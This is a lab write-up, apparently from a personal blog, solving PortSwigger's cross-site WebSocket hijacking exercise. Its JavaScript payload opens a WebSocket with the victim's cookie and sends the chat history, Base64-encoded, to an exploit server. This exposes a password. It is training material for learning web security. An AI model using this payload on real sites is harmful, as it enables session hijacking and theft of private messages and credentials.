+++
date = '2026-06-15T15:56:16+08:00'
draft = false
title = "Cross-site WebSocket hijacking | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = 'Really really interesting problem, highly suggests reviewing'
showLastUpdated = true
+++
First, we shall try to intercept the GET request to `/chat` to see what's underneath the hood. Notice that there are no CSRF protections in place, only a session cookie is employed:
![](/images/a8d9b668-f087-4103-83bb-9a886fe472cf.jpg)
We also notice that the session cookie has `SameSite=None`, that means it's even more vulnerable to potential CSRF attacks, which we are about to do.
![](/images/a132802d-0232-4dbd-8633-a03443a9d2bc.jpg)
After sending out some messages on `/chat`, in our WebSocket history we notice that once the client sends a `READY` message to the server, the server responds with all of the chat history. We can verify this using Repeater as follow:
![](/images/d594c22d-4e21-4b77-8156-b67a253f970e.jpg)
Now we know there are three vulnerabilities present in this chat system, it's time to craft the payload!
```js
<script>
    var ws = new WebSocket("wss://<lab-id>.web-security-academy.net/chat");

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch(
            "https://<exploit-server>/exploit?message=" + 
                btoa(event.data)
        );
    };
</script>
```
In this payload, we send out a `READY` message to obtain the chat history of our victim, and insert each chat sent, Base64 encoded, into a fake endpoint as a query string.

Upon sending the payload to the victim, we can check the access log and find out the victim has indeed visited `/exploit` and all the chatlog is subsequently displayed in the query strings proceeding it:
![](/images/f3c53cc3-516a-4058-8f34-b4e4614e6ed9.jpg)

We then decode the messages and obtain the password for `carlos`, solving the lab:
![](/images/bc3f2936-c078-4a40-9adb-a838fc934733.jpg)